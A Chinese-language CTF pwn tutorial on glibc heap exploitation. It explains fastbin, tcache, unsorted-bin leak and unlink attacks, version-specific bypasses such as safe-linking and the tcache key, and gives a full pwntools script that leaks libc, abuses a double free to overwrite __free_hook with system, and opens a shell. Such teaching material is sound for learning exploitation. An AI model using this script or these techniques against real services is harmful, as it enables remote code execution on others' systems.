# 高级PWN技术（堆利用）

## 描述
当程序使用 glibc 堆管理器（`malloc`/`free`）且存在堆相关漏洞（溢出、UAF、Double Free 等），可通过操纵堆元数据实现任意地址写、信息泄漏，最终获取 Shell。本篇覆盖主流堆攻击技术。

## 触发条件
- 程序有堆菜单（New/Edit/Delete/Show），使用 `malloc`/`free`。
- 存在堆溢出、UAF（释放后未置空指针）、Double Free（重复释放）。
- glibc 版本决定可用技术（glibc 2.23-2.34 技术差异大）。

## glibc 堆基础
- **chunk 结构**：每个堆块有 header（prev_size + size，size 含 flags：P/M/A）+ 用户数据。
- **释放后链入 bin**：
  - **Fastbin**（LIFO 单链表）：大小 ≤ 0x80（64 位），`fd` 指向下一个空闲块。
  - **Unsorted Bin**（FIFO 双链表）：非 fastbin 的释放块先入此处，分配时遍历。
  - **Small Bin** / **Large Bin**：按大小分桶。
- **Tcache**（glibc ≥ 2.26）：每线程缓存，单链表，LIFO，优先于 fastbin。
- **关键钩子**：`__malloc_hook`、`__free_hook`（glibc < 2.34 可写，被调用时执行）。

## 常见漏洞类型

### 1. 堆溢出（Heap Overflow）
- **原理**：向堆块写入超过其大小的数据，覆盖相邻 chunk 的 header 或数据。
- **利用**：
  - 覆盖下一 chunk 的 `size`，伪造大块或跨块合并。
  - 覆盖 fastbin 链表 `fd` 指针，指向伪造 chunk（Fastbin Attack）。
  - 覆盖 `fd`/`bk` 实现 Unlink 攻击。
- **检测**：Edit 功能允许写入长度大于 chunk 实际大小。

### 2. UAF（Use After Free）
- **原理**：`free` 后指针未置空，仍可读写已释放 chunk 的数据。
- **利用**：
  - **读**：泄漏被链入 bin 的 chunk 的 `fd`/`bk`（泄漏 libc/堆地址）。
  - **写**：覆写 `fd` 指针，劫持 fastbin/tcache 链表。
- **步骤**：
  1. `malloc(A)` → `free(A)`（指针悬挂）。
  2. `malloc(B)` 复用 A 的内存（如大小相同）。
  3. 通过 A 的指针读/写 B 的数据（如覆写 B 的 `fd`）。

### 3. Double Free
- **原理**：同一 chunk 被 `free` 两次，链入 bin 两次，导致链表环。
- **利用（Fastbin Double Free）**：
  ```
  free(A); free(B); free(A);  // A 在链表两次
  malloc() -> A; malloc() -> B; malloc() -> A;
  // 第三次 malloc 返回 A，写入 A 的数据即覆盖 A 的 fd
  // 下次 malloc 返回伪造地址
  ```
- **Tcache Double Free**（glibc ≥ 2.26）：Tcache 无 Double Free 检查（< 2.29），可直接 Double Free。
- **glibc 2.29+**：Tcache 有 key 字段检测，需覆盖 key 绕过。

## 高级利用技术

### 1. Fastbin Attack
- **目标**：通过操纵 fastbin/tcache 链表，使 `malloc` 返回任意地址。
- **步骤**：
  1. 利用 UAF/溢出覆写 fastbin chunk 的 `fd` 指向目标地址 `target`。
  2. 在 `target` 处伪造 chunk header（size 字段需匹配 fastbin 大小，如 `0x7f`）。
  3. 连续 `malloc`，第三次返回 `target`，可写 `target` 处数据。
- **常见 target**：
  - `__malloc_hook`（写入 one_gadget）。
  - `__free_hook`（写入 system，free("/bin/sh")）。
  - GOT 表（Full RELRO 不可用）。
- **伪造 size 技巧**：`__malloc_hook` 前 0x23 处有 `0x7f` 字节可作 size（64 位）。

### 2. Unsorted Bin Leak（泄漏 libc 地址）
- **原理**：释放大块（> 0x80，非 fastbin）进入 unsorted bin，其 `fd`/`bk` 指向 `main_arena`（libc 内）。
- **步骤**：
  1. `malloc(0x90)` 创建大块 A。
  2. 再 `malloc` 一块防止与 top chunk 合并。
  3. `free(A)`，A 进入 unsorted bin，`fd` = `bk` = `&main_arena.top`（libc 地址）。
  4. UAF 或重新分配小块（不覆盖 fd）读取 `fd`，计算 libc 基址。
- **计算**：`libc_base = leaked - (main_arena_offset + 88)`（偏移随 libc 版本变）。
- **注意**：chunk 大小需 > fastbin 范围（64 位 > 0x80）。

### 3. Tcache Attack（glibc ≥ 2.26）
- **原理**：Tcache 优先于 fastbin，无 size 严格校验，链表操纵更简单。
- **步骤**：
  1. UAF 覆写 tcache chunk 的 `fd` 指向 `__free_hook`。
  2. `malloc` 两次，第二次返回 `__free_hook`。
  3. 写入 `system` 地址。
  4. `free` 一个内容为 `/bin/sh` 的 chunk → `system("/bin/sh")`。
- **优势**：无需伪造 size，比 fastbin attack 更简单。

### 4. Unlink 攻击（glibc < 2.29）
- **原理**：利用 free 时的合并逻辑，将 chunk 从 bin 解链，实现 `*p = &p - 0x18`。
- **步骤**：
  1. 在 chunk 内伪造 `fd = &p - 0x18`，`bk = &p - 0x10`（p 指向该 chunk 的指针）。
  2. 伪造下一 chunk 的 prev_size 和 size（P 位清零触发合并）。
  3. `free` 触发 unlink，使 `p = &p - 0x18`。
  4. 通过 `p` 写入任意地址（覆盖 GOT 等）。
- **glibc 2.29+**：unlink 检查 `fd->bk == p && bk->fd == p`，需可控制 `&p` 附近数据。

### 5. OneGadget
- **定义**：libc 中满足特定约束即直接 `execve("/bin/sh", ...)` 的 gadget 地址。
- **查找**：`one_gadget ./libc.so.6`，输出多个候选及约束（如 `[rsp+0x30] == NULL`）。
- **使用**：覆写 `__malloc_hook`/`__free_hook` 为 one_gadget，触发时需满足约束。
- **不满足约束时**：尝试不同 one_gadget，或在 hook 前加 `realloc` 调整栈。
  ```
  __malloc_hook -> realloc+N -> one_gadget（调整栈对齐）
  ```

## 常用利用流程（Tcache + UAF，glibc 2.27 示例）
```python
from pwn import *
io = remote('host', port)
libc = ELF('./libc.so.6')

def add(size, data): io.sendlineafter(b'>', b'1'); io.sendlineafter(b':', str(size).encode()); io.sendafter(b':', data)
def free(idx): io.sendlineafter(b'>', b'3'); io.sendlineafter(b':', str(idx).encode())
def show(idx): io.sendlineafter(b'>', b'4'); io.sendlineafter(b':', str(idx).encode())

# 1. 泄漏 libc：创建大块，释放后 UAF 读 fd
add(0x90, b'A')   # idx 0
add(0x20, b'B')   # idx 1 防合并
free(0)
show(0)  # UAF 读 unsorted bin fd
libc_base = u64(io.recv(6).ljust(8, b'\x00')) - (libc.symbols['main_arena'] + 96)
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

# 2. Tcache 攻击：覆写 __free_hook
add(0x20, b'C')   # idx 2
free(2)
free(2)  # Double Free (glibc 2.27 tcache 无检测)
add(0x20, p64(free_hook))  # idx 3, 覆写 fd
add(0x20, b'D')            # idx 4
add(0x20, p64(system))     # idx 5, __free_hook = system

# 3. 触发 free("/bin/sh")
add(0x20, b'/bin/sh\x00')  # idx 6
free(6)  # system("/bin/sh")
io.interactive()
```

## 绕过技巧
- **Tcache key（glibc 2.29+）**：Double Free 检测 key 字段，覆写 key 绕过，或用 UAF 改 fd。
- **Safe-Linking（glibc 2.32+）**：fastbin/tcache 的 fd 加密为 `fd ^ (addr >> 12)`，需先泄漏堆地址解密。
- **Full RELRO**：GOT 只读，改用 `__malloc_hook`/`__free_hook`（< 2.34）或 `_IO_FILE` 攻击。
- **glibc 2.34+**：`__malloc_hook`/`__free_hook` 移除，改用 `_IO_list_all` / exit handler / TLS 攻击。
- **堆地址泄漏**：释放 fastbin chunk 后 UAF 读 `fd`（指向另一堆块）。

## 注意
- glibc 版本至关重要，务必用 `strings libc.so.6 | grep "GNU C Library"` 确认版本。
- 堆布局对齐与大小精确匹配，调试时用 `heap`/`vis_heap_chunks`（pwndbg）观察。
- Tcache 数量有限（默认 7 个），超出转入 fastbin。
- 远程 libc 与本地不同，泄漏地址后用 libc-database 匹配。
- 堆题偏复杂，建议本地 GDB 单步调试，确认每步堆状态符合预期。
